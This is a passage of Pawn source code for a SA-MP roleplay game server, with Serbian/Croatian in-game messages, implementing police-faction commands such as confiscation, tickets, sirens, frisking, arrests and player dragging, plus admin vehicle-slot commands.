    					sql_user_update_integer( igrac, "boat_license", PlayerInfo[ igrac ][ xBrodska ] );
			        }
					else SendErrorMessage( playerid, "Taj igrac nije blizu vas.");
			    }
			}
			else SendErrorMessage( playerid, "Taj igrac nije online.");
		}
		else if(strcmp(opcija, "flyinglicense", true) == 0)
		{
			if( IsPlayerConnected( igrac ) )
			{
			    if( igrac != IPI )
				{
			        if( IsPlayerNearPlayer( 5.0, playerid, igrac ) )
					{
				        SCMF( playerid, 0x33CCFFFF, "#TAKE: {FFFFFF}Oduzeli ste {33CCFF}%s {FFFFFF}dozvolu za letenje.", ImeIgraca( igrac ));
				        SCMF( igrac, 0x33CCFFFF, "#TAKE: {FFFFFF}Policajac {33CCFF}%s {FFFFFF}vam je oduzeo dozvolu za letenje.", ImeIgraca( playerid ));

				        PlayerInfo[ igrac ][ xLetelica ] = 0;
    					sql_user_update_integer( igrac, "air_license", PlayerInfo[ igrac ][ xLetelica ] );
			        }
					else SendErrorMessage( playerid, "Taj igrac nije blizu vas.");
			    }
			}
			else SendErrorMessage( playerid, "Taj igrac nije online.");
		}
		else if(strcmp(opcija, "weapons", true) == 0)
		{
		    new oruzje = 0, w, a;
			if( IsPlayerConnected( igrac ) )
			{
			    if( igrac != IPI )
				{
			        if(IsPlayerNearPlayer( 4.0, playerid, igrac ) )
					{
			            for( new i = 0; i < 13; i++)
						{
							GetPlayerWeaponData(playerid, i, w, a);

							if(w)
							{
							    oruzje++;
							}
						}

				        SCMF( playerid, 0x33CCFFFF, "#TAKE: {FFFFFF}Oduzeli ste {33CCFF}%s {FFFFFF}oruzje.", ImeIgraca( igrac ) );
				        SCMF( igrac, 0x33CCFFFF, "#TAKE: {FFFFFF}Policajac {33CCFF}%s {FFFFFF}vam je oduzeo oruzje.", ImeIgraca( playerid ) );

				        ResetPlayerWeapons( igrac );
        				PlayerInfo[ playerid ][ xTakenWeps ] += oruzje;
						sql_user_update_integer( playerid, "xTakenWeps", PlayerInfo[ playerid ][ xTakenWeps ] );
			        }
					else SendErrorMessage( playerid, "Taj igrac nije blizu vas.");
			    }
			}
			else SendErrorMessage( playerid, "Taj igrac nije online.");
		}
		else if(strcmp(opcija, "drugs", true) == 0)
		{
			if( IsPlayerConnected( igrac ) )
			{
			    if( igrac != IPI )
				{
			        if(IsPlayerNearPlayer( 5.0, playerid, igrac ) )
					{
						SCMF( playerid, 0x33CCFFFF, "#TAKE: {FFFFFF}Oduzeli ste {33CCFF}%s {FFFFFF}svu drogu.", ImeIgraca( igrac ) );
				        SCMF( igrac, 0x33CCFFFF, "#TAKE: {FFFFFF}Policajac {33CCFF}%s {FFFFFF}vam je oduzeo svu drogu.", ImeIgraca( playerid ) );

						PlayerInfo[ playerid ][ xTakenDrugs ] += PlayerInfo[ igrac ][ xTorba_Droga ];
						sql_user_update_integer( playerid, "xTakenDrugs", PlayerInfo[ playerid ][ xTakenDrugs ] );

						PlayerInfo[ igrac ][ xTorba_Droga ] = 0;
						sql_user_update_integer( igrac, "xTorba_Droga", PlayerInfo[ igrac ][ xTorba_Droga ] );
					}
					else SendErrorMessage( playerid, "Taj igrac nije blizu vas!");
			    }
			}
			else SendErrorMessage( playerid, "Taj igrac nije online.");
		}
		else SendErrorMessage( playerid, "Nepoznato ime za oduzimanje.");
    }
	else SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu." );
    return 1;
}

CMD:ticket( playerid, const params[] )
{
    if( GetFactionType( playerid )  != ORG_TIP_VLADINA ) return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu." );
    if( PoliceDuty[ playerid ] == false ) return SendErrorMessage( playerid, "Da bi koristio ovu komandu moras biti policajac na duznosti!");

	new igrac, moneys, reason[14];
	if(sscanf(params, "uis[14]", igrac, moneys, reason ) ) return SendUsageMessage( playerid, "/ticket [id] [cena] [razlog]");
	if(moneys < 500 || moneys > 10000 ) return SendErrorMessage( playerid, "Cena tiketa ne moze biti manja od $500 i veca od $10000.");

	if( IsPlayerConnected( igrac ) )
	{
	    if( igrac != IPI )
		{
     		if( IsPlayerNearPlayer( 5.0, playerid, igrac ) )
	 		{
     		    if( PlayerInfo[ igrac ][ xNovac ] < moneys) return SendErrorMessage( playerid, "Taj igrac nema toliko novaca.");

				SCMF( playerid, 0x33CCFFFF, "(TICKET): Dali ste {FFFFFF}%s {33CCFF}tiket od {FFFFFF}($%d), {FFFFFF}razlog: {33CCFF}%s.", ImeIgraca( igrac ), moneys, reason );
				SCMF( igrac, 0x33CCFFFF, "(TICKET): Policajac {FFFFFF}%s {33CCFF}vam je dao tiket od {FFFFFF}($%d), {FFFFFF}razlog: {33CCFF}%s.", ImeIgraca( playerid ), moneys, reason );
				SendClientMessage( igrac, 0x33CCFFFF, "(TICKET): Ukucajte {FFFFFF}[ /accept ticket ] {33CCFF}da bi ste prihvatili tiket.");

                TicketOffer[igrac] = playerid;
				TicketMoney[igrac] = moneys;
			}
			else SendErrorMessage( playerid, "Taj igrac nije dovoljno blizu vas.");
		}
	}
	else SendErrorMessage( playerid, "Taj igrac je Offline.");
	return 1;
}

CMD:orgstats( playerid )
{
    if( GetFactionType( playerid ) != ORG_TIP_VLADINA ) return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu." );

    ShowPDStats( playerid, playerid );
    return 1;
}

CMD:siren( playerid, const params[] )
{
    if( GetFactionType( playerid ) == ORG_TIP_VLADINA )
	{
        new type,
			VID = GetPlayerVehicleID( playerid );

        if( !IsPlayerInAnyVehicle( playerid ) ) return SendErrorMessage( playerid, "Niste u vozilu.");
		if( IsVehicleBajs( GetPlayerVehicleID( playerid ) ) ) return SendErrorMessage( playerid, "Ne moze sirena na biciklu.");
		if( IsVehicleMotor( GetPlayerVehicleID( playerid ) ) ) return SendErrorMessage( playerid, "Ne moze sirena na motor.");

        if( sscanf( params, "d", type))
        {
            SendUsageMessage( playerid, "/siren [tip]");
            SendClientMessage( playerid, -1, "Tip: | 1: unutrasnjost | 2: krov | 3: ugasi");
            return 1;
        }

        switch(type)
        {
        	case 1:
            {
            	if( Siren[ VID ] == 1) return SendErrorMessage( playerid, "Na ovom vozilu je vec postavljena sirena!");

               	Siren[ VID ] = 1;
               	SirenObject[ VID ] = CreateDynamicObject( 18646, 10.0, 10.0, 1500.0, 0, 0, 0 );
               	AttachDynamicObjectToVehicle( SirenObject[ VID ], VID, 0.0, 0.75, 0.275, 0.0, 0.1, 0.0);

				SendNearbyMessage(playerid, 30.0, 0xC2A2DAFF, "* %s stavlja sirenu na plocu s instrumentima.", ImeIgraca( playerid ) );
                return 1;
            }
        	case 2:
            {
            	if(Siren[ VID ] == 1) return SendErrorMessage( playerid, "Na ovom vozilu vec' je postavljena sirena!");

                Siren[ VID ] = 1;
                SirenObject[ VID ] = CreateDynamicObject(18646, 10.0, 10.0, 1500.0, 0, 0, 0);
                AttachDynamicObjectToVehicle( SirenObject[ VID ], VID, -0.43, 0.0, 0.785, 0.0, 0.1, 0.0);

				SendNearbyMessage(playerid, 30.0, 0xC2A2DAFF, "* %s stavlja sirenu na krov.", ImeIgraca( playerid ) );
                return 1;
            }
        	case 3:
            {
                if(Siren[ VID ] == 0) return SendErrorMessage( playerid, "Nema ugradjene sirene u ovom vozilu!");

                Siren[ VID ] = 0;
                DestroyDynamicObject( SirenObject[ VID ] );

                SendNearbyMessage(playerid, 30.0, 0xC2A2DAFF, "* %s gasi i mice sirenu.", ImeIgraca( playerid ) );
                return 1;
            }
        	default:
            {
                SendClientMessage( playerid, CRVENA, "Pogresan tip sirene! /siren [tip]");
            	SendClientMessage( playerid, -1, "Tip: | 1: unutrasnjost | 2: krov | 3: ugasi");
            }
        }
    }
    else SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu." );
    return 1;
}

CMD:suspend( playerid, const params[] )
{
    if( PlayerInfo[ playerid ][ xRank ] < 5 ) return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu." );
    if( GetFactionType( playerid ) != ORG_TIP_VLADINA ) return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu." );

	new id;
	if( sscanf( params, "u", id ) ) return SendUsageMessage( playerid, "/suspend [id]");
    if( id == IPI ) return SendErrorMessage( playerid, "Pogresan ID Korisnika" );
    if( PlayerInfo[ playerid ][ xRank ] < 6 && PlayerInfo[ id ][ xRank ] >= 5 ) return SendErrorMessage( playerid, "Ne mozes suspendovati rank 5+." );

    PlayerInfo[ id ][ xRank ] = 0;

    new q[ 90 ];
	mysql_format( mSQL, q, sizeof(q), "UPDATE `org_members` SET `memb_rank` = '%d' WHERE `memb_sqlID` = '%d' LIMIT 1", PlayerInfo[ id ][ xRank ], PlayerInfo[ id ][ xID ] );
	mysql_tquery( mSQL, q );

    SendInfoMessage( playerid, "Suspendovali ste igraca {FFFFFF}%s.", ImeIgraca( id ) );
    SendInfoMessage( playerid, "Da skines suspend igracu, samo mu daj rank." );
    SendInfoMessage( id, "{FFFFFF}%s {4282C0}vas je suspendovao.", ImeIgraca( playerid ) );
    return 1;
}

CMD:gov( playerid, const params[] )
{
    if( gettime() < PlayerInfo[ playerid ][ xMute ] ) return SendErrorMessage( playerid, "Ne mozete pricati, usutkani ste.");
	if( PlayerInfo[ playerid ][ xRank ] < 5 ) return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu." );
    if( GetFactionType( playerid ) != ORG_TIP_VLADINA ) return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu." );

	new str[ 128 ];
	if( sscanf( params, "s[128]", str ) ) return SendUsageMessage( playerid, "/gov [tekst]");

	SendClientMessageToAll( 0x0049FFFF, "| *** [ Najava iz Uprave ] *** |");
	SendClientMessageToAllEx( 0x0049FFFF, "[%s] {FFFFFF}%s %s: {0049FF}%s", org_info[ PlayerInfo[ playerid ][ xClan ] ][ oPreFix ], getOrgRank( playerid, PlayerInfo[ playerid ][ xClan ] ), ImeIgraca( playerid ), str );
	SendClientMessageToAll( 0x0049FFFF, "| *** ~~~~~~~~~~~~~~~~~ *** |");
	return 1;
}

CMD:mandescription( playerid, const params[] )
{
    if( GetFactionType( playerid )  != ORG_TIP_VLADINA ) return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu." );
    if( PoliceDuty[ playerid ] == false ) return SendErrorMessage( playerid, "Da bi koristio ovu komandu moras biti policajac na duznosti.");

    new ime[MAX_PLAYER_NAME], text[64], text2[64];
	if( sscanf( params, "s[24]s[64]s[64]", ime, text, text2 ) ) return SendUsageMessage( playerid, "/mandescription [Ime_Prezime] [opis] [zlocin]");

	foreach( new i : Player)
	{
	    if( org_info[ PlayerInfo[ i ][ xClan ] ][ oTip ] == ORG_TIP_VLADINA )
		{
			SCMF( i, 0x0049FFFF, "| *** [ Opis lika ] *** |");
			SCMF( i, 0x0049FFFF, "- Ime: {FFFFFF}%s", ime );
			SCMF( i, 0x0049FFFF, "- Zlocin: {FFFFFF}%s", text2 );
			SCMF( i, 0x0049FFFF, "- Opis: {FFFFFF}%s", text );
			SCMF( i, 0x0049FFFF, "| *** ~~~~~~~~~~~~~ *** |");
		}
	}
	return 1;
}

CMD:equipment( playerid )
{
	new id = inOrgInt[ playerid ];
	if( inOrgInt[ playerid ] == -1 ) return SendErrorMessage( playerid, "Nisi u interijeru drzavne orge." );
    if( GetFactionType( playerid ) != ORG_TIP_VLADINA ) return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu." );
    if( PoliceDuty[ playerid ] == false ) return SendErrorMessage( playerid, "Da bi koristio ovu komandu moras biti policajac na duznosti.");
    if( !IsPlayerInRangeOfPoint( playerid, 3.0, org_info[ id ][ oEquipPoint ][ 0 ], org_info[ id ][ oEquipPoint ][ 1 ], org_info[ id ][ oEquipPoint ][ 2 ] ) ) return SendErrorMessage( playerid, "Nisi kod Armory-ja.");

	ShowPlayerDialog( playerid, dialog_OPREMA, DIALOG_STYLE_LIST, D_NASLOV,
																			"{4282C0}(1). {FFFFFF}Patrolska oprema\n\
																			{4282C0}(2). {FFFFFF}Standardna oprema\n\
																			{4282C0}(3). {FFFFFF}Specijalna oprema\n\
																			{4282C0}(4). {FFFFFF}Profesionalna oprema\n\
																			{4282C0}(5). {FFFFFF}Snajperska oprema\n\
																			{4282C0}(6). {FFFFFF}Pancir\n\
																			{4282C0}(7). {FFFFFF}Health\n\
																			{4282C0}(8). {FFFFFF}SWAT uniforma\n\
																			{4282C0}(9). {FFFFFF}Lisice\n\
																			{4282C0}(10). {FFFFFF}Tazer metkovi", "Potvrdi", "Odustani" );

	return 1;
}
alias:equipment( "eq" );

CMD:frisk( playerid, const params[] )
{
    if( GetFactionType( playerid )  != ORG_TIP_VLADINA ) return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu." );
    if( PoliceDuty[ playerid ] == false ) return SendErrorMessage( playerid, "Da bi koristio ovu komandu moras biti policajac na duznosti.");

    new igrac, weapon[13], bullets[13];
    if( sscanf(params, "r", igrac ) ) return SendUsageMessage( playerid, "/frisk [id]");

	if( IsPlayerConnected( igrac ) )
	{
		if( igrac != IPI )
		{
		    if( IsPlayerNearPlayer( 5.0, playerid, igrac ) && !IsPlayerInAnyVehicle( playerid ) && !IsPlayerInAnyVehicle( igrac ) )
			{
			    if( igrac == playerid ) return SendErrorMessage( playerid, "Ne mozes pretrest sam sebe.");

				SendNearbyMessage(playerid, 20.0, 0xC2A2DAFF, "* %s je pretrazi%s %s za ilegalne predmete.", ImeIgraca( playerid ), getPolForString(playerid, "o", "la"), ImeIgraca( igrac ) );

				SCMF( playerid, 0x33CCFFFF, "[____________________ %s ____________________]", ImeIgraca( igrac ) );
                SCMF( playerid, 0x33CCFFFF, "Materijali: {FFFFFF}(%d)", PlayerInfo[ igrac ][ xMaterijali ]);
				SCMF( playerid, 0x33CCFFFF, "Droga: {FFFFFF}(%dg)", PlayerInfo[ igrac ][ xTorba_Droga ]);

				for( new slot = 0; slot < 13; slot++ )
				{
                    GetPlayerWeaponData( igrac, slot, weapon[ slot ], bullets[ slot ] );

					if( weapon[ slot ] > 0 && bullets[slot] > 0 )
					{
					    SCMF( playerid, 0x33CCFFFF, "Oruzje: {FFFFFF}%s {33CCFF}| Metaka: {FFFFFF}(%d)", WeapNames[ weapon[ slot ] ], bullets[ slot ] );
					}
			    }
			}
			else SendErrorMessage( playerid, "Taj igrac nije blizu vas.");
		}
	}
	else SendErrorMessage( playerid, "Taj igrac nije online.");
    return 1;
}

CMD:dodajslotvozila( playerid, const params[] )
{
    if( PlayerInfo[ playerid ][ xAdmin ] < 7 ) return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu.");

	new id;
    if( sscanf( params, "r", id ) ) return SendUsageMessage( playerid, "/dodajslotvozila [id]"); 
	if( id == IPI ) return SendErrorMessage( playerid, "Taj igrac nije na serveru.");

	if( PlayerInfo[ id ][ xSlotoviVozila ] < MAX_VEH_SLOT )
	{
        PlayerInfo[ id ][ xSlotoviVozila ]++;
        sql_user_update_integer( id, "vehicle_slots", PlayerInfo[ id ][ xSlotoviVozila ] );

	    SCMF( id, 0xFF0000FF, "(VOZILO): Admin {FFFFFF}%s {FF0000}vam je dodao jos jedan slot vozila. Sada imate {FFFFFF}(%d).", ImeIgraca( playerid ), PlayerInfo[ id ][ xSlotoviVozila ] );
		SCMF( playerid, 0xFF0000FF, "(VOZILO): Dodali ste jedan slot vozila {FFFFFF}%s. {FF0000}Sada ima {FFFFFF}(%d).", ImeIgraca( id ), PlayerInfo[ id ][ xSlotoviVozila ] );
	}
	else return SendErrorMessage( playerid, "Igrac vec ima maksimalan broj slotova(%d).", MAX_VEH_SLOT );
	return 1;
}

CMD:skinislotvozila( playerid, const params[] )
{
    if( PlayerInfo[ playerid ][ xAdmin ] < 7 ) return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu.");

	new id;
    if( sscanf( params, "u", id ) ) return SendUsageMessage( playerid, "/skinislotvozila [id]"); 
	if( id == IPI ) return SendErrorMessage( playerid, "Taj igrac nije na serveru.");

	if( PlayerInfo[ id ][ xSlotoviVozila ] > 1 )
	{
        PlayerInfo[ id ][ xSlotoviVozila ]--;
        sql_user_update_integer( id, "vehicle_slots", PlayerInfo[ id ][ xSlotoviVozila ] );

	    SCMF( id, 0xFF0000FF, "(VOZILO): Admin {FFFFFF}%s {FF0000}vam je skinuo jedan slot vozila. Sada imate {FFFFFF}(%d).", ImeIgraca( playerid ), PlayerInfo[ id ][ xSlotoviVozila ] );
		SCMF( playerid, 0xFF0000FF, "(VOZILO): Skinuli ste jedan slot vozila {FFFFFF}%s. {FF0000}Sada ima {FFFFFF}(%d).", ImeIgraca( id ), PlayerInfo[ id ][ xSlotoviVozila ] );
	}
	else return SendErrorMessage( playerid, "Igrac mora imati bar jedan slot." );
	return 1;
}

CMD:playervehicles( playerid, const params[] )
{
    if( PlayerInfo[ playerid ][ xAdmin ] < 7 ) return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu." );

	new ID;
	if( sscanf( params, "u", ID ) ) return SendUsageMessage( playerid, "/playervehicles [id]");
	if( !IsPlayerConnected( ID ) ) return SendErrorMessage( playerid, "Nepravilni ID.");

	ChosenPlayerVeh[ playerid ] = ID;

	new string_gl[ 230 ];
	format( string_gl, sizeof( string_gl ),
		"{4282C0}%s {FFFFFF}ima {4282C0}(%d) {FFFFFF}aktivna slota vozila.\n\
		Slotove vozila dodajete komandom {4282C0}[ /dodajslotvozila ].\n\
		{FFFFFF}A skidate komandom {4282C0}[ /skinislotvozila ].", ImeIgraca( ID ), PlayerInfo[ ID ][ xSlotoviVozila ] );

	ShowPlayerDialog( playerid, dialog_VEHLIST_START, DIALOG_STYLE_MSGBOX, "{FFFFFF}Vozila igraca:", string_gl, "Otvori listu", "Izlaz" );
    return 1;
}
alias:playervehicles( "pv" );

CMD:proveripojas( playerid, const params[] )
{
	if( GetFactionType( playerid ) != ORG_TIP_VLADINA ) return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu." );
	if( PoliceDuty[ playerid ] == false ) return SendErrorMessage( playerid, "Da bi koristio ovu komandu moras biti policajac na duznosti.");

	new ID;
	if( sscanf( params, "d", ID ) ) return SendUsageMessage( playerid, "/proveripojas [id]");
	if( !IsPlayerConnected( ID ) ) return SendErrorMessage( playerid, "Nepravilni ID.");
	if( !IsPlayerNearPlayer( 3.0, playerid, ID ) ) return SendErrorMessage( playerid, "Taj igrac nije pored vas.");
	if( !IsPlayerInAnyVehicle( ID ) ) return SendErrorMessage( playerid, "Igrac nije u vozilu.");

	if( Pojas[ ID ] == true ) SendClientMessage( playerid, 0x33CCFFFF, "(POJAS): Igrac je vezan." );
	else SendClientMessage( playerid, 0x33CCFFFF, "(POJAS): Igrac nije vezan." );
	return 1;
}

CMD:arrest( playerid, const params[] )
{
	if( GetFactionType( playerid ) == ORG_TIP_VLADINA )
	{
	    new id;
		if( sscanf(params, "r", id ) ) return SendUsageMessage( playerid, "/arrest [id]");
	    if( !IsPlayerInRangeOfPoint( playerid, 6.0, 1824.3632, -1538.1356, 13.5469) && !IsPlayerInRangeOfPoint( playerid, 6.0, 1536.1509,-1672.9240,13.1989) && !IsPlayerInRangeOfPoint( playerid, 6.0, 637.4807,-571.7715,16.1875)) return SendErrorMessage( playerid, "Niste na mjestu za uhicenje igraca.");

		if( PoliceDuty[ playerid ] == false ) return SendErrorMessage( playerid, "Da bi koristio ovu komandu moras biti policajac na duznosti.");
		if( IsPlayerConnected( id ) )
		{
		    if( id != IPI )
			{
		        if( id == playerid ) return SendErrorMessage( playerid, "Ne mozete uhapsiti sami sebe.");
                if( org_info[ PlayerInfo[ id ][ xClan ] ][ oTip ] == ORG_TIP_VLADINA ) return SendErrorMessage( playerid, "Ne mozes uhapsiti policajca.");
				if( PlayerInfo[ id ][ xZatvor ] != 0 ) return SendErrorMessage( playerid, "Igrac je vec u zatvoru." );
				if( !IsPlayerNearPlayer(5.0, playerid, id ) ) return SendErrorMessage( playerid, "Taj igrac nije dovoljno blizu vas.");
				if( PlayerInfo[ id ][ xWanted ] < 1 ) return SendErrorMessage( playerid, "Igrac mora imati barem 1 wanted level.");

				new //wanteds = PlayerInfo[ id ][ xWanted ],
					time;

				//if( wanteds < 10 )
				time = PlayerInfo[ id ][ xWanted ]*5;
				//else if( wanteds >= 10 && wanteds <= 50 ) time = 60;
				//else if( wanteds > 50 ) time = 120;

			    new pricepd = PlayerInfo[ id ][ xWanted ]*5000;
			    //if( wanteds > 10 ) pricepd = 6000;

				SCMF( playerid, 0xFF6347FF, "(ARREST): Uhapsili ste {FFFFFF}%s {FF6347}i dobili {FFFFFF}($%d).", ImeIgraca( id ), pricepd );
				DajIgracuNovac( playerid, pricepd );

                for( new i = 1; i < MAX_ORG; i++)
				{
		    		if( org_info[ i ][ oTip ] == ORG_TIP_VLADINA )
					{ 
                		OrgPoruka( i, 0xFF6347FF, "(HQ): Policajac %s je uhapsio osumljicenog %s.", ImeIgraca( playerid ), ImeIgraca( id ) );
					}
				}
				format( globalstring, sizeof( globalstring ), "Uhapsio vas je %s", ImeIgraca( playerid ));
				GameTextForPlayer( id, globalstring, 5000, 5);

				ResetPlayerWeapons( id );
    			PlayerInfo[ id ][ xZatvor ] = JAIL;
   			 	PlayerInfo[ id ][ xZatvorVreme ] = time;

				SCMF( id, 0x33CCFFFF, "(ARREST): Pritvoreni ste na {FFFFFF}(%d) {33CCFF}minuta.", PlayerInfo[ id ][ xZatvorVreme ] );
				SendClientMessage(id, 0x33CCFFFF, "(ARREST): Iz zatvora se mozete vaditi putem kaucije - {FFFFFF}/bail");

				DragedPlayerID[ playerid ] = -1;
				Draged[ id ] = -1;
				PlayerInfo[ id ][ xUhapsen ] += 1;
				PlayerInfo[ playerid ][ xPDUhapsio ] += 1;
				sql_user_update_integer( playerid, "xPDUhapsio", PlayerInfo[ playerid ][ xPDUhapsio ] );
				ClearAnimations( id );
				PlayerCuffed[ id ] = 0;

				if( IsPlayerAttachedObjectSlotUsed( id, OBJECT_SLOT_MAIN ) ) RemovePlayerAttachedObject( id, OBJECT_SLOT_MAIN );
				SetPlayerSpecialAction( id, SPECIAL_ACTION_NONE );

				new rand = random(sizeof(RandomZatvor));
				SMG_SetPlayerPos( id, RandomZatvor[ rand ][ 0 ], RandomZatvor[ rand ][ 1 ],RandomZatvor[ rand ][ 2 ] );
				PlayerInfo[ id ][ xWanted ] = 0;
				SMG_SetPlayerWantedLevel( id, PlayerInfo[ id ][ xWanted ] );
				strmid( ZlocinInfo[ id ][ zPrijavio ], "Nema", 0, strlen("Nema"), 255 );
				strmid( ZlocinInfo[ id ][ zPocinio ], "Nema", 0, strlen("Nema"), 255 );
				strmid( ZlocinInfo[ id ][ zZlocin ], "Nema", 0, strlen("Nema"), 255 );
                UcitajObjekte( id );
			    SetCameraBehindPlayer( id );
				SetPlayerInterior( id, 0);
			    SetPlayerVirtualWorld( id, 0);

				new q[ 190 ];
				mysql_format( mSQL, q, sizeof(q), "UPDATE `users` SET `jail_type` = '%d', `jail_time` = '%d', `wanted_level` = '%d', `arrested` = '%d' WHERE `user_id` = '%d' LIMIT 1",
											PlayerInfo[ id ][ xZatvor ], PlayerInfo[ id ][ xZatvorVreme ], PlayerInfo[ id ][ xWanted ], PlayerInfo[ id ][ xUhapsen ], PlayerInfo[ id ][ xID ] );
				mysql_tquery( mSQL, q );

				OOCNews( 0xFFA500AA, "[LS] Vesti: {FFFFFF}%s {FFA500}je upravo uhapse%s od strane {FFFFFF}%s {FFA500}clana.", ImeIgraca( id ), getPolForString(id, "n", "na"), org_info[ PlayerInfo[ playerid ][ xClan ] ][ oPreFix ] );
 
				DodajWarnRed("~b~(ARREST) %s ~w~je uhapsi%s igraca ~b~%s ~w~| Vreme: ~b~%dm", ImeIgraca( playerid ), getPolForString(playerid, "o", "la"), ImeIgraca( id ), time );
				return 1;
			}
		}
	}
	else SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu." );
	return 1;
}

CMD:pdslap( playerid, const params[] )
{
    if( GetFactionType( playerid ) != ORG_TIP_VLADINA ) return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu." );

	new igrac;
	if( sscanf( params, "r", igrac ) )
	{
		SendUsageMessage( playerid, "/pdslap [id]");
		return 1;
	}
	if( igrac != IPI )
	{
		if( IsPlayerConnected( igrac ) )
		{
		    //if( IsPlayerInAnyVehicle( playerid ) ) return SendErrorMessage( playerid, "Izadjite iz vozila prvo.");
			if( !IsPlayerInAnyVehicle( igrac ) ) return SendErrorMessage( playerid, "Igrac mora biti u vozilu.");
			if( igrac == playerid ) return SendErrorMessage( playerid, "Ne mozete vuci sami sebe." );
			if( IsPlayerNearPlayer( 5.0, playerid, igrac ) )
			{
				if( IsPlayerInAnyVehicle( playerid ) &&
					IsPlayerInAnyVehicle( igrac ) &&
					GetPlayerVehicleID( playerid ) != GetPlayerVehicleID( igrac ) ) return SendErrorMessage( playerid, "Ne mozes da izbacis iz vozila igraca iz drugog vozila." );

				SCMF( igrac, 0x33CCFFFF, "(BP): {FFFFFF}%s {33CCFF}vas je izbaci%s iz vozila.", ImeIgraca( playerid ), getPolForString(playerid, "o", "la") );
				SCMF( playerid, 0x33CCFFFF, "(BP): Izbacili ste {FFFFFF}%s {33CCFF}iz vozila.", ImeIgraca( igrac ) );

				SendNearbyMessage(playerid, 20.0, 0xC2A2DAFF, "* %s je izbaci%s %s iz vozila.", ImeIgraca( playerid ), getPolForString(playerid, "o", "la"), ImeIgraca( igrac ) );

				new Float:x, Float:y, Float:z;
				GetPlayerPos( igrac, x, y, z );
	    		SMG_SetPlayerPos( igrac, x, y, z+5 );
			}
			else return SendErrorMessage( playerid, "Igrac nije pored vas." );
		}
	}
	else return SendErrorMessage( playerid, "Pogresan ID igraca." );
	return 1;
}

CMD:vuci( playerid, const params[] ) 
{
	new igrac;
	if( sscanf( params, "r", igrac ) ) return SendUsageMessage( playerid, "/vuci [id]"); 
	if( igrac != IPI )
	{
		if( IsPlayerConnected( igrac ) )
		{
		    if( IsPlayerInAnyVehicle( playerid ) ) return SendErrorMessage( playerid, "Izadjite iz vozila prvo.");
			if( IsPlayerInAnyVehicle( igrac ) ) return SendErrorMessage( playerid, "Morate prvo izbaciti igraca iz vozila.");
            if( DragedPlayerID[ playerid ] != -1 ) return SendErrorMessage( playerid, "Ne mozete vuci vise od jednog igraca u isto vreme");
			if( igrac == playerid ) return SendErrorMessage( playerid, "Ne mozete vuci sami sebe." );
			if( PlayerCuffed[ igrac ] != 2 ) return SendErrorMessage( playerid, "Igracu prvo morate staviti lisice." );
			if( IsPlayerNearPlayer( 5.0, playerid, igrac ) )
			{
				SendNearbyMessage(playerid, 20.0, 0xC2A2DAFF, "%s vuce %s.", ImeIgraca( playerid ), ImeIgraca( igrac ) );
				SCMF( igrac, 0x33CCFFFF, "(BP): {FFFFFF}%s {33CCFF}vas pocinje vuci.", ImeIgraca( playerid ) );
				SCMF( playerid, 0x33CCFFFF, "(BP): Poceli ste vuci {FFFFFF}%s.", ImeIgraca( igrac ) );

				DragedPlayerID[ playerid ] = igrac;
				Draged[ igrac ] = playerid;
				DragTimer[ playerid ] = SetPlayerTimerEx(playerid, "Vuci", 500, true, "i", playerid);
			}
			else return SendErrorMessage( playerid, "Igrac nije pored vas." );
		}
	}
	else return SendErrorMessage( playerid, "Pogresan ID igraca." );
	return 1;
}

_:public Vuci(playerid)
{
	if( IsPlayerConnected( playerid ) )
	{
		if( IsPlayerConnected( DragedPlayerID[ playerid ] ) )
		{
			if( !IsPlayerInAnyVehicle( playerid ) && ( !IsPlayerInAnyVehicle( DragedPlayerID[ playerid ] ) || IsPlayerInAnyVehicle( DragedPlayerID[ playerid ] ) ) )
			{
				new Float:Pos[ 3 ];
				GetPlayerPos( playerid, Pos[ 0 ], Pos[ 1 ], Pos[ 2 ] );
				SMG_SetPlayerPos( DragedPlayerID[ playerid ], Pos[ 0 ],  Pos[ 1 ]+0.4, Pos[ 2 ]);
				SetPlayerInterior( DragedPlayerID[ playerid ], GetPlayerInterior( playerid ) );
				SetPlayerVirtualWorld( DragedPlayerID[ playerid ], GetPlayerVirtualWorld( playerid ) );
			}
			else if( IsPlayerInAnyVehicle( playerid ) && !IsPlayerInAnyVehicle( DragedPlayerID[ playerid ] ) ) {

				new vehicle = GetPlayerVehicleID(playerid);
				if( IsSeatAvailable( vehicle, 1 ) )
				{
					PutPlayerInVehicle( DragedPlayerID[ playerid ], vehicle, 1 );
				}
				else if( IsSeatAvailable( vehicle, 2 ) )
				{
					PutPlayerInVehicle( DragedPlayerID[ playerid ], vehicle, 2 );
				}
				else if( IsSeatAvailable( vehicle, 3 ) )
				{
					PutPlayerInVehicle( DragedPlayerID[ playerid ], vehicle, 3 );
				}
			}
		}
		else
		{
			KillTimer(DragTimer[ playerid ]);
			DragedPlayerID[ playerid ] = -1;

			SendInfoMessage( playerid, "Igrac kog ste vukli je napustio server.");
		}
	}
    return 1;
}

CMD:pusti( playerid, const params[] ) {
	new igrac;
	if( sscanf( params, "u", igrac ) )
	{
		SendUsageMessage( playerid, "/pusti [id]");
		return 1;
	}
	if( igrac != IPI )
	{
		if( IsPlayerConnected( igrac ) )
		{
		    if( igrac == playerid ) return SendErrorMessage( playerid, "Ne mozete vuci sami sebe." );
		    if( IsPlayerNearPlayer( 5.0, playerid, igrac ) )
			{
		        if( igrac == DragedPlayerID[ playerid ] )
				{
					SCMF( igrac, 0x33CCFFFF, "(BP): {FFFFFF}%s {33CCFF}vas je pustio.", ImeIgraca( playerid ) );
					SCMF( playerid, 0x33CCFFFF, "(BP): Pustili ste {FFFFFF}%s.", ImeIgraca( igrac ) );

					KillTimer(DragTimer[ playerid ]);
